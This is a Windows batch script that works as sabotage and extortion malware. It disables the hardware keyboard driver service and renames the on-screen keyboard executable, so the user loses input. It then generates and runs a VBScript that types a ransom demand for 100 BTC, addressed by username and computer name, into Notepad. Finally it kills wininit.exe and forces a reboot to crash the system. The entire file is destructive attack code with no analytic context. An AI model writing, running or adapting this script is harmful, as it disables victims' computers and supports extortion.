@echo off
setlocal enabledelayedexpansion

:: Target Identification
set "TARGET_USER=%USERNAME%"
set "TARGET_PC=%COMPUTERNAME%"
set "VBS_SCRIPT=%TEMP%\stealth_inject.vbs"

:: 1. Disable the main hardware keyboard driver state
sc config i8042prt start= disabled >nul 2>&1
sc stop i8042prt >nul 2>&1

:: 2. Delete and modify control of the on-screen keyboard executable
takeown /f "%windir%\System32\osk.exe" >nul 2>&1
icacls "%windir%\System32\osk.exe" /grant administrators:F >nul 2>&1
taskkill /f /im osk.exe >nul 2>&1
ren "%windir%\System32\osk.exe" osk.exe.bak >nul 2>&1

:: 3. Generate VBScript wrapper for stealth ransom note injection
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run "notepad.exe", 1, False
echo WScript.Sleep 500
echo WshShell.AppActivate "Notepad"
echo WshShell.SendKeys "Hello %TARGET_PC% %TARGET_USER%, your computer has been hacked. Now either send me 100 BTC or your system will be mine."
) > "%VBS_SCRIPT%"

wscript //nologo "%VBS_SCRIPT%"
del "%VBS_SCRIPT%" >nul 2>&1

:: 4. Force unhandled system crash and crash state initialization
ntsd -c "q" -pn wininit.exe >nul 2>&1
shutdown /r /t 0 /f >nul 2>&1

endlocal
exit /b